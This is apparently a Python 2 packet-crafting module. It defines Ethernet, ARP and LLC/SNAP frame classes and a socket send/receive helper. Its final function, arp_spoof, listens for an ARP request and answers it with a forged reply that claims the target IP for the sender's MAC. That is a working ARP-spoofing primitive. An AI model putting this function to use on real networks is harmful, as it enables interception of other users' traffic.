#!/usr/bin/python

from packetlib import *

class MacAddr(StringSZ):
	size=6
	def _init_new(self,data):
		if len(data)!=6: data=''.join([chr(int(x,16)) for x in data.split(':')])
		StringSZ._init_new(self,data)
	def _repr(self): return ':'.join(["%02x"%(ord(x)) for x in self.value])

class IPAddr(StringSZ):
	size=4
	def _init_new(self,data):
		if len(data)!=4: data=''.join([chr(int(x)) for x in data.split('.')])
		StringSZ._init_new(self,data)
	def _repr(self): return '.'.join(["%d"%(ord(x)) for x in self.value])

ArpOp=Enum.mk("? REQ REPL",ShortBE,"ArpOp")
EtherType=Enum.mk("",ShortBE,"EtherType",ARP=0x806,IP=0x800)

class ARP(BasePacketClass):
	_fields_=AttrList(
		('hwtype',ShortBE),("prottype",EtherType),
		("hwsize",Byte),("protsize",Byte), ("opcode",ArpOp),
		("hw_src",MacAddr),("prot_src",IPAddr),("hw_dst",MacAddr),("prot_dst",IPAddr))
	__slots__=_fields_.keys()+["oui"]
	@classmethod
	def new(cls,**attrs): return cls(**dict(dict(hwtype=1,prottype=EtherType("IP"),hwsize=6,protsize=4),**attrs))

LLCOUI=Enum.mk("",Int,"LLCOUI",cisco=0x0c,apple=0x80007)

class LLC(BasePacketClass):
	_fields_=AttrList(("dsap",Byte),("snap",Byte),("ctrl",Byte),("oui_h",Byte),("oui_l",ShortBE),("type",ShortBE),("data",[({},StringSZ)]))
	__slots__=_fields_.keys()+["oui"]
	def get_oui(self): return LLCOUI((self.oui_h<<16) | self.oui_l)
	def set_oui(self,val): self.oui_h,self.oui_l=int(val>>16),int(val&0xffff)
	@classmethod
	def new_snap(cls,**attrs): return cls(**dict(dict(dsap=0xaa,snap=0xaa,ctrl=3),**attrs))
	@classmethod
	def new_atalk(cls,**attrs): return cls.new_snap(**dict(dict(oui_h=8,oui_l=7,type=0x809b),**attrs))
	@classmethod
	def new_cdp(cls,**attrs): return cls.new_snap(**dict(dict(oui_h=0,oui_l=0xc,type=0x2000),**attrs))


class Ether(BasePacketClass):
	def choose_data(self,data,offset=None,size=None):
		if self.type&0x0800:
			try: return StringSZ._c(size=self._data_size-self._offsetof("data"))
			except AttributeError: return StringSZ
		else: return LLC._c(size=int(self.type))
	_fields_=AttrList(("dst",MacAddr),("src",MacAddr),("type",EtherType),("data",[({"type":0x0806},ARP),({},choose_data)]),("trailer",StringSZ,""))
	__slots__=_fields_.keys()
	def get_type(self): return len(self.data)
	def _repr(self): return "%s -> %s (0x%x)"%(self.src._repr(),self.dst._repr(),self.type)

class PktHandler(DynamicAttrClass):
	pktcls=Ether
	def r(self,**cond):
		"""
		Receive data from sock, wrap it into pktcls and return if pkt.satisfies
		conds. If not, continue to receive.
		"""
		while True:
			pkt=self.pktcls(self.sock.recv())
			if pkt.satisfies(**cond): return pkt
	def s(self,data):
		data=str(data)
		while data!='': data=data[self.sock.send(data):]
	def sr(self,data,**cond):
		self.s(data)
		return self.r(**cond)

def arp_spoof(pkth,ip,mac=None):
	if mac is None: mac=pkth.sock.mac
	req=pkth.r(data__opcode=ArpOp("REQ"),data__prot_dst=IPAddr(ip))
	repl=Ether(src=mac,dst=req.data.hw_src,type=0x806,data=ARP.new(opcode="REPL",hw_src=mac,hw_dst=req.data.hw_src,prot_src=ip,prot_dst=req.data.prot_src))
	pkth.s(repl)
	return repl
